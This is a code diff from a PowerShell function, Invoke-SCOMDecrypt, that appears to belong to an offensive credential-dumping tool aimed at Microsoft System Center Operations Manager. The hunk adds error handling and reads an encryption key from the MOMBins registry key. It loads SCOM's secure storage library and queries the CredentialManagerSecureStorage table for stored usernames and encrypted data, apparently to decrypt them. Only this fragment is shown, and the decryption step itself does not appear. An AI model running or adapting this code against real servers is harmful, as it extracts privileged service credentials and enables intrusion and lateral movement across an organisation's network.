@@ -14,10 +14,33 @@ function Invoke-SCOMDecrypt {
 	[System.Reflection.Assembly]::LoadFile("C:\Program Files\Microsoft System Center 2012 R2\Operations Manager\Server\Microsoft.Mom.Sdk.SecureStorageManager.dll") | Out-Null
 	[System.Reflection.Assembly]::LoadFile("C:\Program Files\Microsoft System Center 2012 R2\Operations Manager\Server\Microsoft.EnterpriseManagement.DataAccessLayer.dll") | Out-Null
 	$scom = New-Object Microsoft.EnterpriseManagement.Security.SecureStorageManager
+	$server = $null
+	$database = $null
+	$key = $null
 
-	$reg = Get-ItemProperty "hklm:SOFTWARE\Microsoft\System Center\2010\Common\Database"
-	$server = $reg.DatabaseServerName
-	$database = $reg.DatabaseName
+	Try
+	{
+		$reg = Get-ItemProperty "hklm:SOFTWARE\Microsoft\System Center\2010\Common\Database" -erroraction stop
+		$server = $reg.DatabaseServerName
+		$database = $reg.DatabaseName
+	}
+	Catch [System.Management.Automation.ItemNotFoundException]
+	{
+		Write-Host "[!] Unable to detect SQL server"
+		return
+	}
+
+	Try
+	{
+		$reg = Get-ItemProperty "hklm:SOFTWARE\Microsoft\System Center\2010\Common\MOMBins" -erroraction stop
+		$key = $reg.Value1
+	}
+	Catch [System.Management.Automation.ItemNotFoundException]
+	{
+		Write-Host "[!] Unable to find key"
+		return
+	}
+	
 	$sqlCommand = "SELECT UserName, Data FROM dbo.CredentialManagerSecureStorage;"
 	$connectionString = "Server=$server;Database=$database;Trusted_Connection=True;"
 	$connection = new-object system.data.SqlClient.SQLConnection($connectionString)
